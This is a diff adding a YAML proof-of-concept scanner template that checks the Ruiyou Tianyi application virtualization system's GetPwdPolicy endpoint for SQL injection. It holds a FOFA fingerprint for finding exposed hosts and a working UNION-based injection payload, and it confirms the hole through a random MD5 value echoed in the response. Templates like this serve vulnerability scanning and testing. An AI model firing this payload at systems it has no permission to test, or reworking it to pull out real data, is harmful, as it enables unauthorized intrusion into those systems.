@@ -1,0 +1,18 @@
+id: poc-yaml-gwt-system-getpwdpolicy-sqli
+info:
+  name: 瑞友天翼应用虚拟化系统 GetPwdPolicy SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  - 两高一弱
+  finger: 瑞友天翼应用虚拟化系统
+  fofa: body="瑞友天翼 - 应用虚拟化系统"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /RAPAgent.XGI?CMD=GetPwdPolicy&User=1%27+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CCONCAT%280x7e%2C%28SELECT+MD5({{.t1}})%29%2C0x7e%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+-
+  expression: status_code == 200 && contains(body,"result=0") && contains(body,"PwdPolicy=")
+    && !contains(body,"<") && contains(body,t2)
+transport: http
